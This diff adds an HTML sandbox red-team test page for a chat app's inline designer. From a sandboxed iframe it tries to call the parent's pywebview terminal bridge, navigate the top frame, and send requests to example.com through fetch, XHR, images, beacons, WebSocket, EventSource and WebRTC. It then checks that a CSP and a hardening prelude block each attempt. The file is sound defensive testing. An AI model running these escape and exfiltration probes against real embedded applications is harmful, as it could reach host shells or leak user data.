@@ -1,0 +1,458 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<title>Mimi Chat — Sandbox Red-Team</title>
+<style>
+  :root { color-scheme: light dark; }
+  body { font: 14px/1.4 ui-monospace, SFMono-Regular, Menlo, monospace; padding: 16px; max-width: 980px; margin: 0 auto; }
+  h1 { font-size: 18px; margin: 0 0 8px; }
+  .lede { color: #777; margin: 0 0 16px; }
+  .stats { display: flex; gap: 8px; margin: 12px 0; font-weight: 600; }
+  .stats .pill { padding: 4px 10px; border-radius: 999px; }
+  .stats .pass { background: #1a4d2a; color: #b8f5c8; }
+  .stats .fail { background: #5a1717; color: #ffc8c8; }
+  .stats .pending { background: #444; color: #ddd; }
+  .grid { display: grid; grid-template-columns: 28px 1fr 90px; gap: 4px 12px; align-items: start; padding: 8px 12px; border: 1px solid #333; border-radius: 8px; background: rgba(127,127,127,0.05); }
+  .grid > .num { color: #888; }
+  .grid > .label { font-weight: 500; }
+  .grid > .verdict { font-weight: 700; text-align: right; }
+  .grid > .detail { grid-column: 2 / 4; color: #888; font-size: 12px; word-break: break-word; }
+  .pass-txt { color: #4caf50; }
+  .fail-txt { color: #ef5350; }
+  .pending-txt { color: #aaa; }
+  iframe { width: 100%; height: 1px; border: 0; visibility: hidden; }
+  .frame-stage { margin-top: 16px; padding: 12px; border: 1px dashed #555; border-radius: 8px; background: rgba(127,127,127,0.05); }
+  .frame-stage h2 { font-size: 14px; margin: 0 0 8px; color: #aaa; }
+  pre { background: rgba(127,127,127,0.08); padding: 8px; border-radius: 6px; overflow: auto; font-size: 12px; }
+  .note { margin-top: 16px; padding: 10px 12px; border-left: 3px solid #f0c14b; background: rgba(240,193,75,0.08); color: #c9a85b; font-size: 13px; }
+  .copy-row { display: flex; align-items: center; gap: 10px; margin: 12px 0 4px; }
+  .copy-btn { padding: 6px 12px; border-radius: 6px; border: 1px solid #555; background: rgba(127,127,127,0.1); color: inherit; cursor: pointer; font: inherit; }
+  .copy-btn:hover { background: rgba(127,127,127,0.2); }
+  .copy-btn:active { transform: translateY(1px); }
+  .copy-status { font-size: 12px; color: #aaa; }
+  .copy-ta { width: 100%; min-height: 220px; margin: 4px 0 8px; padding: 8px; background: rgba(127,127,127,0.08); color: inherit; border: 1px solid #555; border-radius: 6px; font: 12px ui-monospace, SFMono-Regular, Menlo, monospace; resize: vertical; }
+  .copy-ta[hidden] { display: none; }
+</style>
+</head>
+<body>
+  <h1>Sandbox red-team test</h1>
+  <p class="lede">
+    A child <code>&lt;iframe sandbox="allow-scripts" srcdoc="..."&gt;</code> tries to escape its
+    sandbox via several channels. Each PASS = attack was blocked = sandbox held.
+    All must PASS before we ship the inline-designer feature.
+  </p>
+
+  <div class="stats">
+    <span class="pill pass">PASS <span id="n-pass">0</span></span>
+    <span class="pill fail">FAIL <span id="n-fail">0</span></span>
+    <span class="pill pending">pending <span id="n-pend">0</span></span>
+  </div>
+
+  <div class="copy-row">
+    <button type="button" class="copy-btn" id="copy-btn">Copy results</button>
+    <span class="copy-status" id="copy-status"></span>
+  </div>
+  <textarea id="copy-textarea" class="copy-ta" spellcheck="false" readonly hidden></textarea>
+
+  <div id="results"></div>
+
+  <div class="frame-stage">
+    <h2>The sandboxed iframe (kept tiny &amp; hidden)</h2>
+    <iframe id="rt-frame"
+            referrerpolicy="no-referrer"
+            sandbox="allow-scripts"></iframe>
+    <p style="margin:6px 0 0;color:#888;font-size:12px">
+      The iframe runs <em>inside</em> this same parent document, which (when launched via the
+      <code>--redteam</code> flag) has a real <code>window.pywebview.api</code> bridge attached —
+      so any escape would actually be reachable.
+    </p>
+  </div>
+
+  <div class="note">
+    <strong>Manual check:</strong> open DevTools → Network and confirm no requests leave the
+    process during the test run. Programmatic asserts catch CSP-blocked attempts; a network
+    sniff is the belt-and-braces verification.
+  </div>
+
+<script>
+// ──────────────────────────────────────────────────────────────────────────
+// Each test gets seeded as PENDING, then flipped to PASS/FAIL by either
+// (a) a postMessage from the iframe, or
+// (b) a parent-side check at the end (e.g. confirming top.location didn't change).
+// ──────────────────────────────────────────────────────────────────────────
+const TESTS = [
+  { id: 'parent_pywebview',     label: 'Read parent.pywebview.api object' },
+  { id: 'parent_call',          label: 'Invoke parent.pywebview.api.terminal_start(...)' },
+  { id: 'top_nav',              label: 'Set top.location to external URL' },
+  { id: 'window_open',          label: 'window.open(external URL)' },
+  { id: 'fetch_external',       label: 'fetch(https://example.com)' },
+  { id: 'xhr_external',         label: 'XMLHttpRequest GET https://example.com' },
+  { id: 'image_external',       label: 'new Image().src = https://example.com/leak' },
+  { id: 'beacon_external',      label: 'navigator.sendBeacon(https://example.com, ...)' },
+  { id: 'websocket_external',   label: 'new WebSocket(wss://example.com)' },
+  { id: 'eventsource_external', label: 'new EventSource(https://example.com)' },
+  { id: 'rtc_peer_connection',  label: 'new RTCPeerConnection (WebRTC exfil vector)' },
+  { id: 'cookie_read',          label: 'Read document.cookie (should be empty/throw)' },
+  { id: 'localstorage_read',    label: 'Read localStorage (should throw)' },
+  { id: 'parent_postmessage',   label: 'postMessage to parent fires (telemetry only)' },
+];
+
+const state = Object.fromEntries(TESTS.map(t => [t.id, { status: 'pending', detail: '' }]));
+
+function render() {
+  const grid = document.getElementById('results');
+  grid.innerHTML = '';
+  let pass = 0, fail = 0, pend = 0;
+  TESTS.forEach((t, idx) => {
+    const s = state[t.id];
+    if (s.status === 'pass') pass++;
+    else if (s.status === 'fail') fail++;
+    else pend++;
+    const wrap = document.createElement('div');
+    wrap.className = 'grid';
+    wrap.innerHTML = `
+      <div class="num">${idx + 1}</div>
+      <div class="label"></div>
+      <div class="verdict ${s.status === 'pass' ? 'pass-txt' : s.status === 'fail' ? 'fail-txt' : 'pending-txt'}">${s.status.toUpperCase()}</div>
+      <div class="detail"></div>
+    `;
+    wrap.querySelector('.label').textContent = t.label;
+    wrap.querySelector('.detail').textContent = s.detail || '';
+    grid.appendChild(wrap);
+  });
+  document.getElementById('n-pass').textContent = pass;
+  document.getElementById('n-fail').textContent = fail;
+  document.getElementById('n-pend').textContent = pend;
+}
+render();
+
+function setResult(id, status, detail) {
+  if (!state[id]) return;
+  state[id] = { status, detail: detail || '' };
+  render();
+}
+
+// The parent receives postMessage results from the sandboxed iframe.
+// CRITICAL: this is for the test only. The real feature must not trust
+// postMessage from sandbox iframes.
+window.addEventListener('message', (ev) => {
+  const data = ev.data;
+  if (!data || typeof data !== 'object') return;
+  if (data.kind === 'rt:result' && typeof data.id === 'string') {
+    // status: 'pass' if attack threw / blocked / returned null,
+    // 'fail' if it succeeded.
+    setResult(data.id, data.status === 'pass' ? 'pass' : 'fail', String(data.detail || ''));
+  }
+});
+
+// Mirror of _INLINE_DESIGNER_PRELUDE in index.html. Keep in lockstep so the
+// red-team test exercises the exact prelude that ships in the renderer.
+const HARDENING_PRELUDE = `
+(function () {
+  'use strict';
+  try {
+    Object.defineProperty(Navigator.prototype, 'sendBeacon', {
+      value: function () { return false; },
+      writable: false, configurable: false, enumerable: true,
+    });
+  } catch (e) {}
+  ['RTCPeerConnection', 'webkitRTCPeerConnection', 'mozRTCPeerConnection', 'WebTransport'].forEach(function (k) {
+    try { delete window[k]; } catch (e) {}
+    try {
+      Object.defineProperty(window, k, {
+        get: function () { return undefined; },
+        set: function () {},
+        configurable: false,
+      });
+    } catch (e) {}
+  });
+})();
+`;
+
+const sandboxedDoc = `<!doctype html>
+<html><head>
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; font-src data:; connect-src 'none'; frame-src 'none'; worker-src 'none'; frame-ancestors 'none'; form-action 'none'; base-uri 'none';">
+<script>${HARDENING_PRELUDE}<\/script>
+</head><body>
+<script>
+(function () {
+  const send = (id, status, detail) => {
+    try { parent.postMessage({ kind: 'rt:result', id, status, detail }, '*'); }
+    catch (e) { /* if even this fails, parent will time out; visible on the dashboard */ }
+  };
+  // Catch async CSP violations so we can flip their tests to PASS.
+  window.addEventListener('unhandledrejection', (ev) => {
+    // Best-effort attribution by message text.
+    const msg = String((ev.reason && ev.reason.message) || ev.reason || '');
+    // We let the per-test handlers below do their own catches; this is just a backstop.
+  });
+
+  // 1. parent.pywebview.api object read
+  try {
+    const probe = parent.pywebview && parent.pywebview.api;
+    if (probe) send('parent_pywebview', 'fail', 'Reached parent.pywebview.api object: ' + Object.keys(probe).slice(0, 5).join(','));
+    else send('parent_pywebview', 'pass', 'parent.pywebview is undefined or null inside sandbox');
+  } catch (e) {
+    send('parent_pywebview', 'pass', 'Threw on parent.pywebview access: ' + e.name);
+  }
+
+  // 2. invoke a method on the parent's pywebview bridge
+  (async () => {
+    try {
+      const r = await parent.pywebview.api.terminal_start(80, 24, null);
+      send('parent_call', 'fail', 'Call returned: ' + JSON.stringify(r).slice(0, 80));
+    } catch (e) {
+      send('parent_call', 'pass', 'Threw: ' + e.name + ' / ' + (e.message || '').slice(0, 60));
+    }
+  })();
+
+  // 3. top-frame navigation
+  try {
+    const before = String(top.location && top.location.href || '');
+    top.location = 'https://example.com/redteam-nav';
+    setTimeout(() => {
+      try {
+        const after = String(top.location && top.location.href || '');
+        if (after !== before && /example\\.com/i.test(after)) {
+          send('top_nav', 'fail', 'Top navigated to ' + after);
+        } else {
+          send('top_nav', 'pass', 'Top did not navigate (still ' + after.slice(0, 60) + ')');
+        }
+      } catch (e) {
+        send('top_nav', 'pass', 'Reading top.location threw: ' + e.name);
+      }
+    }, 100);
+  } catch (e) {
+    send('top_nav', 'pass', 'Setting top.location threw: ' + e.name);
+  }
+
+  // 4. window.open
+  try {
+    const w = window.open('https://example.com/redteam-open', '_blank');
+    if (w) send('window_open', 'fail', 'window.open returned a window');
+    else send('window_open', 'pass', 'window.open returned null');
+  } catch (e) {
+    send('window_open', 'pass', 'window.open threw: ' + e.name);
+  }
+
+  // 5. fetch
+  fetch('https://example.com/redteam-fetch', { mode: 'no-cors' })
+    .then(() => send('fetch_external', 'fail', 'fetch resolved (request likely sent)'))
+    .catch((e) => send('fetch_external', 'pass', 'fetch rejected: ' + (e.message || e.name || '').slice(0, 80)));
+
+  // 6. XHR
+  try {
+    const x = new XMLHttpRequest();
+    x.onload = () => send('xhr_external', 'fail', 'XHR loaded with status ' + x.status);
+    x.onerror = () => send('xhr_external', 'pass', 'XHR onerror fired (CSP block or net fail)');
+    x.open('GET', 'https://example.com/redteam-xhr', true);
+    x.send();
+  } catch (e) {
+    send('xhr_external', 'pass', 'XHR threw: ' + e.name);
+  }
+
+  // 7. Image exfil
+  try {
+    const img = new Image();
+    img.onload = () => send('image_external', 'fail', 'Image loaded — request was made');
+    img.onerror = () => send('image_external', 'pass', 'Image errored (CSP img-src data: blocks https URLs)');
+    img.src = 'https://example.com/redteam-img.png?x=' + Date.now();
+  } catch (e) {
+    send('image_external', 'pass', 'new Image() threw: ' + e.name);
+  }
+
+  // 8. sendBeacon. QtWebEngine has been observed returning true from
+  // sendBeacon even when CSP connect-src 'none' should block it — so a
+  // false return alone is not a sufficient signal. The hardening prelude
+  // installs a no-op override; PASS requires that override to be
+  // detectable AND the call to return false.
+  try {
+    const navProto = Object.getOwnPropertyDescriptor(Navigator.prototype, 'sendBeacon');
+    const overridden = !!(navProto && navProto.writable === false && navProto.configurable === false);
+    const ok = navigator.sendBeacon
+      ? navigator.sendBeacon('https://example.com/redteam-beacon', 'data')
+      : false;
+    if (ok) {
+      send('beacon_external', 'fail', 'sendBeacon returned true (request may have been queued)');
+    } else if (!overridden) {
+      send('beacon_external', 'fail', 'sendBeacon returned false but the hardening override is NOT in place');
+    } else {
+      send('beacon_external', 'pass', 'sendBeacon overridden by prelude and returned false');
+    }
+  } catch (e) {
+    send('beacon_external', 'pass', 'sendBeacon threw: ' + e.name);
+  }
+
+  // 9. WebSocket
+  try {
+    const ws = new WebSocket('wss://example.com/redteam-ws');
+    ws.onopen = () => { send('websocket_external', 'fail', 'WebSocket opened'); try { ws.close(); } catch (_) {} };
+    ws.onerror = () => send('websocket_external', 'pass', 'WebSocket errored (CSP or network)');
+    setTimeout(() => {
+      if (state_unknown('websocket_external')) send('websocket_external', 'pass', 'WebSocket never connected (timeout)');
+    }, 1500);
+  } catch (e) {
+    send('websocket_external', 'pass', 'WebSocket constructor threw: ' + e.name);
+  }
+  function state_unknown(id) { return false; /* parent owns state; this is just a hint */ }
+
+  // 10. EventSource
+  try {
+    const es = new EventSource('https://example.com/redteam-sse');
+    es.onopen = () => { send('eventsource_external', 'fail', 'EventSource opened'); try { es.close(); } catch (_) {} };
+    es.onerror = () => send('eventsource_external', 'pass', 'EventSource errored (CSP or network)');
+  } catch (e) {
+    send('eventsource_external', 'pass', 'EventSource constructor threw: ' + e.name);
+  }
+
+  // 11. RTCPeerConnection — WebRTC's ICE machinery can leak the host IP and
+  // open data channels without going through fetch/CSP connect-src. The
+  // hardening prelude defines the constructor as a getter that returns
+  // undefined; PASS = the constructor is no longer callable.
+  try {
+    const PC = window.RTCPeerConnection
+      || window.webkitRTCPeerConnection
+      || window.mozRTCPeerConnection;
+    if (typeof PC === 'function') {
+      try {
+        const pc = new PC({ iceServers: [] });
+        send('rtc_peer_connection', 'fail', 'RTCPeerConnection constructor still callable: ' + (pc && pc.constructor && pc.constructor.name));
+        try { pc.close(); } catch (_) {}
+      } catch (e) {
+        send('rtc_peer_connection', 'pass', 'RTCPeerConnection constructor threw: ' + e.name);
+      }
+    } else {
+      send('rtc_peer_connection', 'pass', 'RTCPeerConnection is undefined (defanged by prelude)');
+    }
+  } catch (e) {
+    send('rtc_peer_connection', 'pass', 'Accessing RTCPeerConnection threw: ' + e.name);
+  }
+
+  // 12. document.cookie
+  try {
+    const c = document.cookie;
+    // Sandboxed unique-origin documents get '' for cookies; that's fine and counts as PASS.
+    send('cookie_read', c ? 'fail' : 'pass', c ? ('Got cookie: ' + c.slice(0, 40)) : 'cookie is empty');
+  } catch (e) {
+    send('cookie_read', 'pass', 'cookie read threw (expected for opaque origin): ' + e.name);
+  }
+
+  // 13. localStorage
+  try {
+    const ls = window.localStorage;
+    if (ls) {
+      ls.setItem('redteam', '1');
+      send('localstorage_read', 'fail', 'localStorage usable; wrote item');
+    } else {
+      send('localstorage_read', 'pass', 'localStorage is null');
+    }
+  } catch (e) {
+    send('localstorage_read', 'pass', 'localStorage threw: ' + e.name);
+  }
+
+  // 14. postMessage to parent — sanity check that telemetry channel works.
+  // (If this is the only thing that PASSes, the others may have timed out.)
+  send('parent_postmessage', 'pass', 'postMessage delivered (parent received this row)');
+})();
+<\/script>
+</body></html>`;
+
+document.getElementById('rt-frame').srcdoc = sandboxedDoc;
+
+// Final sweep after a short delay — anything still pending becomes a soft FAIL
+// so we don't ship while a vector silently never reported.
+setTimeout(() => {
+  for (const t of TESTS) {
+    if (state[t.id].status === 'pending') {
+      setResult(t.id, 'fail', 'No result reported within 3s — investigate before shipping');
+    }
+  }
+}, 3000);
+
+function _buildCopyText() {
+  let pass = 0, fail = 0, pend = 0;
+  for (const t of TESTS) {
+    const s = state[t.id].status;
+    if (s === 'pass') pass++;
+    else if (s === 'fail') fail++;
+    else pend++;
+  }
+  const lines = [];
+  lines.push('Mimi Chat sandbox red-team results');
+  lines.push(`User-Agent: ${navigator.userAgent}`);
+  lines.push(`Summary: ${pass} PASS · ${fail} FAIL · ${pend} pending`);
+  lines.push('');
+  TESTS.forEach((t, idx) => {
+    const s = state[t.id];
+    lines.push(`${(idx + 1).toString().padStart(2, ' ')}. [${s.status.toUpperCase().padEnd(7, ' ')}] ${t.label}`);
+    if (s.detail) lines.push(`    ${s.detail}`);
+  });
+  return lines.join('\n');
+}
+
+async function copyResults() {
+  const status = document.getElementById('copy-status');
+  const ta = document.getElementById('copy-textarea');
+  const text = _buildCopyText();
+
+  // Always reveal the textarea — even if a programmatic copy succeeds, a
+  // visible textarea gives the user a fallback they can verify by eye and
+  // re-copy if needed. Auto-select so Ctrl+C / Cmd+C just works.
+  ta.value = text;
+  ta.hidden = false;
+  ta.focus();
+  ta.select();
+
+  // Try the pywebview bridge first — it shells out to xclip/pbcopy/clip on
+  // the host, which works on file:// where navigator.clipboard is blocked.
+  try {
+    const api = window.pywebview && window.pywebview.api;
+    if (api && typeof api.copy_to_clipboard === 'function') {
+      const ok = await api.copy_to_clipboard(text);
+      if (ok) {
+        status.textContent = 'copied via pywebview bridge';
+        return;
+      }
+      console.warn('pywebview copy_to_clipboard returned false (xclip/pbcopy missing?)');
+    } else {
+      console.warn('pywebview.api.copy_to_clipboard unavailable');
+    }
+  } catch (e) {
+    console.warn('pywebview copy_to_clipboard threw:', e);
+  }
+
+  // Fallback: navigator.clipboard. This usually fails on file:// — included
+  // for the case of opening the page in a regular browser for debugging.
+  try {
+    await navigator.clipboard.writeText(text);
+    status.textContent = 'copied via navigator.clipboard';
+    return;
+  } catch (e) {
+    console.warn('navigator.clipboard.writeText threw:', e);
+  }
+
+  // Last resort: legacy execCommand. Many builds ignore this from file://
+  // origins, but it's free to try.
+  try {
+    if (document.execCommand && document.execCommand('copy')) {
+      status.textContent = 'copied via execCommand';
+      return;
+    }
+  } catch (e) {
+    console.warn('execCommand("copy") threw:', e);
+  }
+
+  status.textContent = 'auto-copy unavailable — text is selected, press Ctrl+C / Cmd+C';
+}
+
+document.getElementById('copy-btn').addEventListener('click', () => {
+  copyResults().catch((err) => {
+    console.error('copyResults failed:', err);
+    const status = document.getElementById('copy-status');
+    if (status) status.textContent = 'error: ' + (err && err.message || err);
+  });
+});
+</script>
+</body>
+</html>
